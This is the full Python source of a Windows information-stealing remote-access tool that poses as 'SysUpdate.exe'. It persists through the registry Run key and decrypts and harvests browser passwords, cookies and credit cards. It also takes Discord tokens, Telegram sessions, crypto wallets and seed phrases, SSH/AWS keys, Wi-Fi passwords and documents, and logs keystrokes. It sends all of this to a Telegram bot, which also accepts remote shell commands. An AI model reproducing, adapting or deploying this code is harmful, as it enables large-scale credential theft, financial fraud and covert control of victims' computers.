import os, sys, re, json, time, glob, shutil, socket, sqlite3, base64, zipfile, tempfile
import subprocess, threading, getpass, platform, hashlib
from datetime import datetime, timezone
import requests, pyperclip, win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import ImageGrab
from pynput import keyboard

TOKEN = "9253886928:AAGY7pS_Gl1xecJINi5ElZBeJRZiSAfp4mI''
CHAT  = "7508842597"
API   = f"https://api.telegram.org/bot{TOKEN}/"
NAME  = "SysUpdate.exe"
DIR   = os.path.join(os.environ.get("APPDATA", "."), "SysUpdate")
ME    = os.path.abspath(sys.argv[0])
OUT   = os.path.join(os.environ.get("TEMP", "."), "g" + str(int(time.time())))
TAG   = f"{getpass.getuser()}@{socket.gethostname()}"
buf, lock, off = [], threading.Lock(), 0

BROWSERS = {
    "Chrome":  r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "Edge":    r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "Brave":   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "Vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data",
    "Opera":   r"%APPDATA%\Opera Software\Opera Stable",
    "OperaGX": r"%APPDATA%\Opera Software\Opera GX Stable",
}
FF_DIR = os.path.join(os.environ.get("APPDATA", ""), r"Mozilla\Firefox\Profiles")
WALLET_EXT = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm",
              "bfnaelmomeimhlpmgjnjophhpkkoljpa", "hnfanknocfeofbddgcijnmhnfnkdnaad",
              "egjidjbpglichdcondbcbdnbeeppgdph", "acmacodkjbdgmoleebolmdjonilkdbch"]
DOC_EXT = {".txt",".pdf",".doc",".docx",".xls",".xlsx",".csv",".json",".kdbx",".ovpn",
           ".rdp",".pem",".key",".ppk",".env",".sql",".bak",".conf",".cfg",".ini"}

def send(t):
    try: requests.post(API+"sendMessage", data={"chat_id":CHAT,"text":t[:4000]}, timeout=20)
    except Exception: pass

def send_doc(path, cap=45*1024*1024):
    try:
        if os.path.getsize(path) > cap:
            send("too big to send: " + str(os.path.getsize(path)))
            return
        with open(path,"rb") as f:
            requests.post(API+"sendDocument", data={"chat_id":CHAT},
                          files={"document":(os.path.basename(path), f)}, timeout=180)
    except Exception as e: send("send failed: "+str(e))

def sh(c):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=120)
        return (r.stdout or r.stderr)[:3900] or "(no output)"
    except Exception as e: return str(e)

# ---------- persistence ----------
def persist():
    try:
        os.makedirs(DIR, exist_ok=True)
        dest = os.path.join(DIR, NAME)
        if not os.path.exists(dest): shutil.copy2(ME, dest)
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "SysUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(k)
        if os.path.normcase(ME) != os.path.normcase(dest):
            subprocess.Popen([dest], creationflags=0x00000008)
            os._exit(0)
    except Exception as e: send("persist: "+str(e))

def unpersist():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "SysUpdate"); winreg.CloseKey(k)
    except Exception: pass
    shutil.rmtree(DIR, ignore_errors=True)

# ---------- crypto ----------
def master_key(ud):
    ls = os.path.join(ud, "Local State")
    try:
        d = json.load(open(ls, encoding="utf-8"))
        raw = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except Exception: return None

def dec(blob, key):
    if not blob: return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            if not key: return ""
            return AESGCM(key).decrypt(blob[3:15], blob[15:], None).decode("utf-8","ignore")
        if blob[:3] == b"v20": return "<v20:app-bound>"
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8","ignore")
    except Exception: return ""

def tmp_copy(p):
    try:
        d = os.path.join(OUT, "_db"); os.makedirs(d, exist_ok=True)
        t = os.path.join(d, hashlib.md5(p.encode()).hexdigest() + ".db")
        for _ in range(4):
            try: shutil.copy2(p, t); return t
            except Exception: time.sleep(.4)
    except Exception: pass
    return None

# ---------- browsers ----------
def profiles(ud):
    out = []
    for e in os.listdir(ud):
        p = os.path.join(ud, e)
        if os.path.isdir(p) and (os.path.exists(os.path.join(p,"Network","Cookies"))
                                 or os.path.exists(os.path.join(p,"Cookies"))):
            out.append(p)
    return out

def chrome_all():
    lines = []
    for label, raw in BROWSERS.items():
        ud = os.path.expandvars(raw)
        if not os.path.isdir(ud): continue
        key = master_key(ud)
        for prof in profiles(ud):
            pn = os.path.basename(prof)
            ck = os.path.join(prof, "Network", "Cookies")
            if not os.path.exists(ck): ck = os.path.join(prof, "Cookies")
            t = tmp_copy(ck)
            if t:
                try:
                    con = sqlite3.connect(t)
                    rows = con.execute("SELECT host_key,name,encrypted_value,path,expires_utc FROM cookies").fetchall()
                    for h, n, ev, pa, ex in rows:
                        v = dec(ev, key)
                        if v: lines.append(f"{label}|{pn}\tCOOKIE\t{h}\t{n}\t{v}\t{pa}")
                    con.close()
                except Exception: pass
            for fn, q, kind in (
                ("Login Data", "SELECT origin_url,username_value,password_value FROM logins", "LOGIN"),
                ("Web Data", "SELECT name_on_card,card_number_encrypted,expiration_month,expiration_year FROM credit_cards", "CARD")):
                t = tmp_copy(os.path.join(prof, fn))
                if not t: continue
                try:
                    con = sqlite3.connect(t)
                    for r in con.execute(q).fetchall():
                        if kind == "LOGIN":
                            u, un, pw = r
                            if un or pw: lines.append(f"{label}|{pn}\tLOGIN\t{u}\t{un}\t{dec(pw,key)}")
                        else:
                            nm, cn, m, y = r
                            lines.append(f"{label}|{pn}\tCARD\t{nm}\t{dec(cn,key)}\t{m}/{y}")
                    con.close()
                except Exception: pass
            t = tmp_copy(os.path.join(prof, "History"))
            if t:
                try:
                    con = sqlite3.connect(t)
                    for u, ti, vc in con.execute(
                        "SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 400"):
                        lines.append(f"{label}|{pn}\tHIST\t{u}\t{ti}\t{vc}")
                    con.close()
                except Exception: pass
    return lines

def firefox_all():
    lines = []
    if not os.path.isdir(FF_DIR): return lines
    for prof in glob.glob(os.path.join(FF_DIR, "*")):
        pn = os.path.basename(prof)
        t = tmp_copy(os.path.join(prof, "cookies.sqlite"))
        if t:
            try:
                con = sqlite3.connect(t)
                for h, n, v, pa in con.execute("SELECT host,name,value,path FROM moz_cookies"):
                    if v: lines.append(f"Firefox|{pn}\tCOOKIE\t{h}\t{n}\t{v}\t{pa}")
                con.close()
            except Exception: pass
        t = tmp_copy(os.path.join(prof, "places.sqlite"))
        if t:
            try:
                con = sqlite3.connect(t)
                for u, ti in con.execute(
                    "SELECT url,title FROM moz_places ORDER BY visit_count DESC LIMIT 400"):
                    lines.append(f"Firefox|{pn}\tHIST\t{u}\t{ti}\t")
                con.close()
            except Exception: pass
        lj = os.path.join(prof, "logins.json")
        if os.path.exists(lj):
            shutil.copy2(lj, os.path.join(OUT, f"ff_logins_{pn}.json"))
    return lines

# ---------- tokens, wallets ----------
def discord_tokens():
    out = set()
    pat = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}")
    for base in (r"%APPDATA%\discord", r"%APPDATA%\discordcanary",
                 r"%APPDATA%\Lightcord", r"%APPDATA%\discordptb"):
        b = os.path.expandvars(base)
        if not os.path.isdir(b): continue
        for f in glob.glob(os.path.join(b, "Local Storage", "leveldb", "*")):
            try:
                for m in pat.findall(open(f, errors="ignore").read()): out.add(m)
            except Exception: pass
    return sorted(out)

def telegram_session():
    t = os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata")
    if os.path.isdir(t):
        shutil.copytree(t, os.path.join(OUT, "telegram_tdata"), dirs_exist_ok=True)

def steam():
    for base in (r"%PROGRAMFILES(X86)%\Steam", r"%PROGRAMFILES%\Steam"):
        b = os.path.expandvars(base)
        cfg = os.path.join(b, "config")
        if os.path.isdir(cfg):
            d = os.path.join(OUT, "steam")
            os.makedirs(d, exist_ok=True)
            for f in glob.glob(os.path.join(cfg, "*")):
                try: shutil.copy2(f, d)
                except Exception: pass

def wallets():
    for ext in WALLET_EXT:
        for ud in (r"%LOCALAPPDATA%\Google\Chrome\User Data",
                   r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
                   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"):
            p = os.path.join(os.path.expandvars(ud), "Default", "Local Extension Settings", ext)
            if os.path.isdir(p):
                shutil.copytree(p, os.path.join(OUT, "w_"+ext+"_"+os.path.basename(os.path.dirname(os.path.dirname(p)))),
                                dirs_exist_ok=True)
    for app in (r"%APPDATA%\Exodus", r"%APPDATA%\Electrum", r"%APPDATA%\Atomic",
                r"%APPDATA%\Bitcoin", r"%APPDATA%\Ethereum"):
        p = os.path.expandvars(app)
        if os.path.isdir(p):
            shutil.copytree(p, os.path.join(OUT, "app_"+os.path.basename(p)), dirs_exist_ok=True,
                            ignore=shutil.ignore_patterns("*.log","cache","Cache"))

def seeds():
    hits = []
    pat = re.compile(r"\b(?:[a-z]{3,8}\s+){11,23}[a-z]{3,8}\b")
    for root in (os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"),
                 os.path.expanduser("~/Downloads")):
        for f in glob.glob(os.path.join(root, "**", "*.txt"), recursive=True):
            try:
                if os.path.getsize(f) > 200000: continue
                txt = open(f, errors="ignore").read().lower()
                if "seed" in txt or "mnemonic" in txt or pat.search(txt):
                    hits.append(f"--- {f}\n{txt[:1500]}")
            except Exception: pass
    return hits

def grab_files():
    d = os.path.join(OUT, "files"); os.makedirs(d, exist_ok=True)
    n = 0
    for root in (os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"),
                 os.path.expanduser("~/Downloads")):
        for dp, _, fs in os.walk(root):
            for f in fs:
                if n > 600: return
                if os.path.splitext(f)[1].lower() not in DOC_EXT: continue
                try:
                    p = os.path.join(dp, f)
                    if os.path.getsize(p) > 2*1024*1024: continue
                    shutil.copy2(p, os.path.join(d, f"{n}_{f}")); n += 1
                except Exception: pass

def keys_and_env():
    for p in (os.path.expanduser("~/.ssh"), os.path.expanduser("~/.aws")):
        if os.path.isdir(p):
            shutil.copytree(p, os.path.join(OUT, "cfg_"+os.path.basename(p)), dirs_exist_ok=True)
    e = os.path.join(OUT, "env.txt")
    with open(e, "w", encoding="utf-8") as f:
        for k, v in os.environ.items(): f.write(f"{k}={v}\n")

def wifi():
    out = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True).stdout
    res = []
    for line in out.splitlines():
        if "All User Profile" in line:
            n = line.split(":",1)[1].strip()
            d = subprocess.run(["netsh","wlan","show","profile",n,"key=clear"],
                               capture_output=True, text=True).stdout
            pw = [l.split(":",1)[1].strip() for l in d.splitlines() if "Key Content" in l]
            res.append(f"{n} : {pw[0] if pw else '(open)'}")
    return res

def sysinfo():
    return (f"user: {getpass.getuser()}\nhost: {socket.gethostname()}\n"
            f"os: {platform.platform()}\narch: {platform.machine()}\n"
            f"cpu: {os.cpu_count()}\npath: {ME}\n"
            f"lan: {socket.gethostbyname(socket.gethostname())}")

# ---------- full run ----------
def grab():
    os.makedirs(OUT, exist_ok=True)
    send(f"[{TAG}] grab started")
    with open(os.path.join(OUT, "sysinfo.txt"), "w", encoding="utf-8") as f: f.write(sysinfo())
    try: open(os.path.join(OUT,"wifi.txt"),"w",encoding="utf-8").write("\n".join(wifi()))
    except Exception: pass
    try:
        lines = chrome_all() + firefox_all()
        open(os.path.join(OUT,"creds.tsv"),"w",encoding="utf-8").write("\n".join(lines))
    except Exception as e: send("browsers: "+str(e))
    try: open(os.path.join(OUT,"discord.txt"),"w").write("\n".join(discord_tokens()))
    except Exception: pass
    try: open(os.path.join(OUT,"seeds.txt"),"w",encoding="utf-8").write("\n\n".join(seeds()))
    except Exception: pass
    try: telegram_session()
    except Exception: pass
    try: steam()
    except Exception: pass
    try: wallets()
    except Exception: pass
    try: keys_and_env()
    except Exception: pass
    try: grab_files()
    except Exception: pass
    try: ImageGrab.grab().save(os.path.join(OUT,"screen.png"))
    except Exception: pass
    try: open(os.path.join(OUT,"clip.txt"),"w",encoding="utf-8").write(pyperclip.paste() or "")
    except Exception: pass
    z = os.path.join(os.environ["TEMP"], f"{getpass.getuser()}_{int(time.time())}.zip")
    with zipfile.ZipFile(z,"w",zipfile.ZIP_DEFLATED) as zf:
        for dp, _, fs in os.walk(OUT):
            for f in fs:
                p = os.path.join(dp, f)
                zf.write(p, os.path.relpath(p, OUT))
    send(f"[{TAG}] grab done, {round(os.path.getsize(z)/1048576,1)} MB")
    send_doc(z)
    shutil.rmtree(OUT, ignore_errors=True)

# ---------- keylogger ----------
def on_press(key):
    try: c = key.char
    except AttributeError:
        c = {"Key.space":" ","Key.enter":"\n","Key.tab":"\t","Key.backspace":"<BS>"}.get(str(key),"")
    if c:
        with lock: buf.append(c)

def flusher():
    while True:
        time.sleep(90)
        with lock:
            if len(buf) < 10: continue
            chunk, buf[:] = "".join(buf), []
        if chunk: send("[KEYS "+TAG+"]\n"+chunk)

# ---------- command channel ----------
def handle(c):
    c = c.strip()
    if c == "/grab": threading.Thread(target=grab, daemon=True).start()
    elif c == "/info": send(sysinfo())
    elif c == "/keys":
        with lock: chunk, buf[:] = "".join(buf), []
        send("[KEYS]\n"+(chunk or "(empty)"))
    elif c == "/screen":
        p = os.path.join(os.environ["TEMP"],"s.png")
        ImageGrab.grab().save(p); send_doc(p)
    elif c == "/clip": send("[CLIP] "+(pyperclip.paste() or "(empty)"))
    elif c == "/wifi": send("[WIFI]\n"+"\n".join(wifi()))
    elif c == "/persist": persist(); send("reinstalled")
    elif c == "/die": unpersist(); send("bye"); os._exit(0)
    elif c.startswith("/shell"): send(sh(c[6:].strip()))

def loop():
    global off
    while True:
        try:
            r = requests.get(API+"getUpdates", params={"offset":off,"timeout":30}, timeout=40).json()
            for u in r.get("result", []):
                off = u["update_id"] + 1
                m = u.get("message", {}).get("text", "")
                if m.startswith("/"): handle(m)
        except Exception: time.sleep(5)

if __name__ == "__main__":
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: s.bind(("127.0.0.1", 47771))
    except OSError: os._exit(0)
    persist()
    send(f"[{TAG}] online")
    threading.Thread(target=flusher, daemon=True).start()
    threading.Thread(target=grab, daemon=True).start()
    threading.Thread(target=loop, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as l: l.join()
